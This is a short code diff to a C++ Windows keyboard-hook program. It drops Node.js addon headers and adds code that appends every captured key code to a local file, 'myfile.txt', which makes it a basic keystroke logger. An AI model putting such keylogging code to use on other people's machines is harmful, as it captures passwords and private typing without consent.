@@ -1,7 +1,9 @@
 #include <iostream>
-#include <node.h>
 #include <Windows.h>
-#include <node_api.h>
+#include <fstream>
+
+
+std::ofstream fileStream;
 // Keyboard hook procedure
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION) {
@@ -12,6 +14,9 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
         else if (wParam == WM_KEYUP) {
             std::cout << "Key released: " << pKeyboardHookStruct->vkCode << std::endl;
         }
+        fileStream.open("myfile.txt", std::ios::app);
+        fileStream << pKeyboardHookStruct->vkCode << std::endl;
+        fileStream.close();
     }
     // Call the next hook procedure in the chain
     return CallNextHookEx(NULL, nCode, wParam, lParam);
